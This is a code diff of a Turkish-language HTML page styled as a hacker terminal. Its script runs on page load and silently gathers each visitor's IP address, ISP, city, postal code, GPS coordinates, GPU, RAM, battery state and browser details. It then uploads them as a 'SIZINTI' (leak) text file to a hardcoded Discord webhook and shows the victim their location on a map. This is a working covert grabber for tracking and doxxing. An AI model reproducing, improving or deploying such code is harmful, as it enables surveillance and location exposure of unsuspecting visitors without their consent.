@@ -5,29 +5,61 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Welcome Qeat'S World</title>
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        .terminal { width: 95%; max-width: 800px; background: rgba(0, 0, 0, 0.95); border: 1px solid #00ff41; padding: 30px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); position: relative; }
-        .line { margin-bottom: 12px; font-size: 14px; white-space: nowrap; overflow: hidden; border-right: .15em solid orange; width: 0; }
-        .type-1 { animation: typing 1s steps(40, end) forwards 0.2s, blink-caret .75s step-end infinite; }
-        .type-2 { animation: typing 1s steps(40, end) forwards 1.2s, blink-caret .75s step-end infinite; }
-        .type-3 { animation: typing 1s steps(40, end) forwards 2.2s, blink-caret .75s step-end infinite; }
-        @keyframes typing { from { width: 0 } to { width: 100% } }
+        body { 
+            background: #050505; 
+            color: #00ff41; 
+            font-family: 'Courier New', monospace; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            overflow-y: auto; 
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .terminal { 
+            width: 100%; 
+            max-width: 750px; 
+            background: rgba(10, 10, 10, 0.95); 
+            border: 1px solid #00ff41; 
+            padding: 30px; 
+            box-shadow: 0 0 25px rgba(0, 255, 65, 0.2); 
+            position: relative; 
+            box-sizing: border-box;
+        }
+        .line { 
+            margin-bottom: 12px; 
+            font-size: 15px; 
+            white-space: nowrap; 
+            overflow: hidden; 
+            border-right: .15em solid #00ff41; 
+            width: 0; 
+            opacity: 0;
+        }
+        .type-1 { animation: typing 1s steps(30, end) forwards 0.2s, blink-caret .75s step-end 3; opacity: 1; }
+        .type-2 { animation: typing 1s steps(30, end) forwards 1.5s, blink-caret .75s step-end 3; opacity: 1; }
+        .type-3 { animation: typing 1s steps(30, end) forwards 2.8s, blink-caret .75s step-end infinite; opacity: 1; }
+        
+        @keyframes typing { from { width: 0 } to { max-width: 100%; width: 100%; } }
         @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #00ff41; } }
-        .progress-container { width: 100%; background-color: #111; height: 4px; margin: 20px 0; display: none; }
-        .progress-bar { width: 0%; height: 100%; background-color: #00ff41; box-shadow: 0 0 10px #00ff41; }
-        #result-box { margin-top: 20px; display: none; border-top: 1px solid #333; padding-top: 15px; font-size: 13px; }
-        .map-frame { width: 100%; height: 200px; margin-top: 15px; border: 1px solid #444; filter: grayscale(1) invert(1) contrast(1.2); }
-        .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .label { color: #888; }
-        .value { color: #ff0000; font-weight: bold; }
+        
+        .progress-container { width: 100%; background-color: #111; height: 6px; margin: 25px 0; display: none; border: 1px solid #222; }
+        .progress-bar { width: 0%; height: 100%; background-color: #00ff41; box-shadow: 0 0 10px #00ff41; transition: width 0.05s linear; }
+        
+        #result-box { margin-top: 20px; display: none; border-top: 1px solid #00ff41; padding-top: 20px; font-size: 14px; }
+        .map-frame { width: 100%; height: 220px; margin-top: 20px; border: 1px solid #00ff41; filter: invert(0.9) hue-rotate(90deg) saturate(0.5); }
+        .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 15px; }
+        .label { color: #00aa2c; }
+        .value { color: #ff3333; font-weight: bold; text-shadow: 0 0 5px rgba(255,51,51,0.3); }
     </style>
 </head>
 <body>
 
 <div class="terminal">
-    <div class="line type-1">> Bir Dakika Bekleyin...</div>
-    <div class="line type-2">> Çok Az Kaldı!</div>
-    <div class="line type-3">> Tüm Kaynak Paketleri İndirildi!</div>
+    <div class="line type-1">> Veri paketleri sorgulanıyor...</div>
+    <div class="line type-2">> Matris bağlantısı kuruluyor...</div>
+    <div class="line type-3">> Sistem kaynakları optimize edildi!</div>
     
     <div class="progress-container" id="loader">
         <div class="progress-bar" id="bar"></div>
@@ -35,20 +67,23 @@
 
     <div id="result-box">
         <div class="data-grid">
-            <div><span class="label">> IP:</span> <span class="value" id="user-ip">...</span></div>
-            <div><span class="label">> GPU:</span> <span class="value" id="user-gpu">Analiz ediliyor...</span></div>
-            <div><span class="label">> SİSTEM:</span> <span class="value" id="user-sys">...</span></div>
-            <div><span class="label">> ŞARJ:</span> <span class="value" id="user-bat">...</span></div>
+            <div><span class="label">> IP ADRESİ:</span> <span class="value" id="user-ip">Yükleniyor...</span></div>
+            <div><span class="label">> EKRAN KARTI:</span> <span class="value" id="user-gpu">Yükleniyor...</span></div>
+            <div><span class="label">> İŞLETİM SİSTEMİ:</span> <span class="value" id="user-sys">Yükleniyor...</span></div>
+            <div><span class="label">> BATARYA DURUMU:</span> <span class="value" id="user-bat">Yükleniyor...</span></div>
         </div>
         <iframe id="gmap" class="map-frame" frameborder="0" scrolling="no"></iframe>
-        <div style="margin-top: 15px; font-size: 10px; color: #444; text-align: center;">Kayıt No: #<span id="reg-no"></span> | VERİLER .TXT OLARAK ARŞİVLENDİ.</div>
+        <div style="margin-top: 20px; font-size: 11px; color: #555; text-align: center; letter-spacing: 1px;">
+            KAYIT NO: #<span id="reg-no">00000</span> | VERİ TRANSFERİ GÜVENLİ ŞEKİLDE TAMAMLANDI.
+        </div>
     </div>
 </div>
 
 <script>
+    // Discord Webhook URL'niz
     const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
 
-    // ⚡️ Ekran Kartı (GPU) Bilgisini Çekme
+    // GPU (Ekran Kartı) Bilgisi Alma
     function getGPUInfo() {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -57,8 +92,8 @@
         return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
     }
 
+    // Ana Veri Toplama Fonksiyonu
     async function deepCapture() {
-        // Cihaz Detayları
         const gpu = getGPUInfo();
         const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor";
         const cores = navigator.hardwareConcurrency || "Bilinmiyor";
@@ -72,49 +107,22 @@
             batTime = battery.dischargingTime === Infinity ? "Prizde" : `${Math.round(battery.dischargingTime / 60)} dk`;
         } catch(e) {}
 
-        fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(async (data) => {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
             const time = new Date().toLocaleString('tr-TR');
             
-            // --- .txt RAPOR İÇERİĞİ ---
-            const report = `
-[QEAT RAPORU]
-Zaman: ${time}
-----------------------------------------
-[IP & KONUM]
-IP: ${data.ip}
-ISS: ${data.org}
-Konum: ${data.city} / ${data.region} / ${data.country_name}
-Posta Kodu: ${data.postal}
-Para Birimi: ${data.currency_name} (${data.currency})
-Koordinat: ${data.latitude}, ${data.longitude}
+            // Txt Raporu Oluşturma
+            const report = `[QEAT RAPORU]\nZaman: ${time}\n----------------------------------------\n[IP & KONUM]\nIP: ${data.ip}\nISS: ${data.org}\nKonum: ${data.city} / ${data.region} / ${data.country_name}\nPosta Kodu: ${data.postal}\nPara Birimi: ${data.currency_name} (${data.currency})\nKoordinat: ${data.latitude}, ${data.longitude}\n\n[DONANIM & GRAFIK]\nEkran Kartı (GPU): ${gpu}\nİşlemci Çekirdek: ${cores}\nYaklaşık RAM: ${ram}\nEkran Çözünürlüğü: ${window.screen.width}x${window.screen.height}\nDokunmatik Ekran: ${touch}\n\n[SISTEM & DURUM]\nİşletim Sistemi: ${navigator.platform}\nTarayıcı: ${navigator.userAgent}\nŞarj Seviyesi: ${batLevel}\nKalan Süre: ${batTime}\nPDF Desteği: ${pdf}\n----------------------------------------\nDURUM: TÜM VERİLER BAŞARIYLA ÇEKİLDİ.`;
 
-[DONANIM & GRAFIK]
-Ekran Kartı (GPU): ${gpu}
-İşlemci Çekirdek: ${cores}
-Yaklaşık RAM: ${ram}
-Ekran Çözünürlüğü: ${window.screen.width}x${window.screen.height}
-Dokunmatik Ekran: ${touch}
-
-[SISTEM & DURUM]
-İşletim Sistemi: ${navigator.platform}
-Tarayıcı: ${navigator.userAgent}
-Şarj Seviyesi: ${batLevel}
-Kalan Süre: ${batTime}
-PDF Desteği: ${pdf}
-----------------------------------------
-DURUM: TÜM VERİLER BAŞARIYLA ÇEKİLDİ.
-`;
-
-            // --- DISCORD GÖNDERİMİ ---
+            // Discord Payloadi hazirlama
             const formData = new FormData();
             const payload = {
                 username: "Siber İstihbarat Ajanı",
                 embeds: [{
-                    title: "Yeni Bilgiler HGldi",
-                    color: 0xff0000,
-                    description: `🎯 **Hedef:** \`${data.ip}\`\n🎮 **GPU:** \`${gpu}\`\n📂 Detaylı rapor aşağıda eklendi.`,
+                    title: "🎯 Yeni Veri Girişi Sağlandı",
+                    color: 16711680,
+                    description: `**Hedef IP:** \`${data.ip}\`\n**Cihaz:** \`${navigator.platform}\`\n**GPU:** \`${gpu}\`\n\n📂 *Detaylı .txt raporu eklendi.*`,
                     timestamp: new Date()
                 }]
             };
@@ -123,38 +131,53 @@ DURUM: TÜM VERİLER BAŞARIYLA ÇEKİLDİ.
             const blob = new Blob([report], { type: 'text/plain' });
             formData.append('file', blob, `SIZINTI_${data.ip}.txt`);
 
+            // Discord'a Arka Planda Gönder
             await fetch(webhookURL, { method: 'POST', body: formData });
 
-            // Ekran Güncelleme
+            // Verileri Global Hafızaya Al ve Animasyonu Başlat
             window.cachedData = {...data, gpu, batLevel, platform: navigator.platform};
-            window.cachedRegNo = Math.floor(Math.random() * 99999);
-        });
+            window.cachedRegNo = Math.floor(10000 + Math.random() * 90000);
+            
+            // Terminal yazı animasyonları bitsin diye 3.8 saniye sonra yükleme barını başlatıyoruz
+            setTimeout(startProgressBar, 3800);
+
+        } catch (error) {
+            console.error("Veri çekme veya gönderme hatası:", error);
+        }
     }
 
-    deepCapture();
-
-    // Bar Animasyonu
-    setTimeout(() => {
+    // Yükleme Barı Animasyonu (Yalnızca veri hazır olduğunda tetiklenir)
+    function startProgressBar() {
         const loader = document.getElementById('loader');
         const bar = document.getElementById('bar');
         loader.style.display = 'block';
+        
         let width = 0;
         let int = setInterval(() => {
             if (width >= 100) {
                 clearInterval(int);
+                
+                // Arayüzü Güncelle
                 document.getElementById('user-ip').innerText = window.cachedData.ip;
-                document.getElementById('user-gpu').innerText = window.cachedData.gpu.substring(0, 20) + "...";
+                document.getElementById('user-gpu').innerText = window.cachedData.gpu ? (window.cachedData.gpu.substring(0, 25) + "...") : "Bilinmiyor";
                 document.getElementById('user-sys').innerText = window.cachedData.platform;
                 document.getElementById('user-bat').innerText = window.cachedData.batLevel;
                 document.getElementById('reg-no').innerText = window.cachedRegNo;
-                document.getElementById('gmap').src = `https://maps.google.com/maps?q=${window.cachedData.latitude},${window.cachedData.longitude}&z=14&output=embed`;
+                
+                // Haritayı yükle
+                document.getElementById('gmap').src = `https://maps.google.com/maps?q=${window.cachedData.latitude},${window.cachedData.longitude}&z=13&output=embed`;
+                
+                // Sonuç Kutusunu Göster
                 document.getElementById('result-box').style.display = 'block';
             } else {
-                width += 5;
+                width += 4;
                 bar.style.width = width + '%';
             }
-        }, 50);
-    }, 2000);
+        }, 60);
+    }
+
+    // Sayfa açıldığında işlemi başlat
+    window.addEventListener('DOMContentLoaded', deepCapture);
 </script>
 </body>
 </html>
